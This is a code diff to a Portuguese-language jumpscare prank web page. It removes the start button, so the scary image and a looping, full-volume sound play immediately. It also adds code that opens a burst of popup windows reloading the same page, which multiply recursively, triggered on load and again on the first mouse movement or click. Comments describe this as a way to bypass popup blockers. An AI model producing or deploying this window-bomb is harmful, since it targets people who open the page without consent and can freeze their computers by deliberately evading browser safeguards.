@@ -11,29 +11,15 @@
             padding: 0;
             overflow: hidden;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
             color: #fff;
             font-family: monospace;
-            cursor: pointer;
-        }
-
-        #start-btn {
-            padding: 15px 30px;
-            font-size: 1.2rem;
-            background-color: #ff0000;
-            color: white;
-            border: none;
-            cursor: pointer;
-            font-family: monospace;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7);
-            z-index: 10000;
         }
 
         #jumpscare-container {
-            display: none;
+            display: flex;
             position: fixed;
             top: 0;
             left: 0;
@@ -76,8 +62,6 @@
 </head>
 <body>
 
-    <button id="start-btn">CLIQUE PARA ACESSAR AS MEMÓRIAS</button>
-
     <div id="jumpscare-container">
         <img id="jumpscare-img" class="scare-effect" src="aindanao.png" alt="Jumpscare">
     </div>
@@ -85,33 +69,40 @@
     <audio id="scare-sound" src="SMILEDOG.mp3" preload="auto" loop></audio>
 
     <script>
-        const btn = document.getElementById('start-btn');
-        const container = document.getElementById('jumpscare-container');
         const sound = document.getElementById('scare-sound');
 
-        function triggerPrank() {
-            btn.style.display = 'none';
-            container.style.display = 'flex';
-
+        function abrirJanelasEmMassa() {
+            // Tenta tocar o áudio imediatamente
             sound.volume = 1.0;
-            sound.play().catch(err => console.log(err));
+            sound.play().catch(err => console.log("Áudio bloqueado pelo navegador:", err));
 
-            // Dispara várias janelas espalhadas pela tela de uma só vez
-            let totalJanelas = 12; // Podes aumentar se quiseres (cuidado para não travar o PC deles)
-            
-            for (let i = 0; i < totalJanelas; i++) {
+            // Dispara uma rajada de tentativas de abrir janelas em posições aleatórias
+            for (let i = 0; i < 15; i++) {
                 setTimeout(() => {
-                    const randomX = Math.floor(Math.random() * (window.screen.width - 500));
-                    const randomY = Math.floor(Math.random() * (window.screen.height - 400));
+                    const randomX = Math.floor(Math.random() * (window.screen.width - 400));
+                    const randomY = Math.floor(Math.random() * (window.screen.height - 300));
                     const largura = 400 + Math.floor(Math.random() * 200);
                     const altura = 300 + Math.floor(Math.random() * 200);
                     
                     window.open(window.location.href, '_blank', `width=${largura},height=${altura},left=${randomX},top=${randomY}`);
-                }, i * 50); // Abre uma rajada quase instantânea com 50ms de diferença entre cada uma
+                }, i * 30); // Intervalo curtíssimo para soltar as janelas em cascata
             }
         }
 
-        btn.addEventListener('click', triggerPrank);
+        // Tenta disparar assim que o HTML é carregado
+        window.addEventListener('DOMContentLoaded', () => {
+            abrirJanelasEmMassa();
+        });
+
+        // Truque extra: Se o bloqueador barrar na entrada, qualquer micromovimento 
+        // ou clique involuntário na tela dispara a rajada completa instantaneamente
+        window.addEventListener('mousemove', () => {
+            abrirJanelasEmMassa();
+        }, { once: true });
+
+        window.addEventListener('click', () => {
+            abrirJanelasEmMassa();
+        }, { once: true });
     </script>
 </body>
 </html>
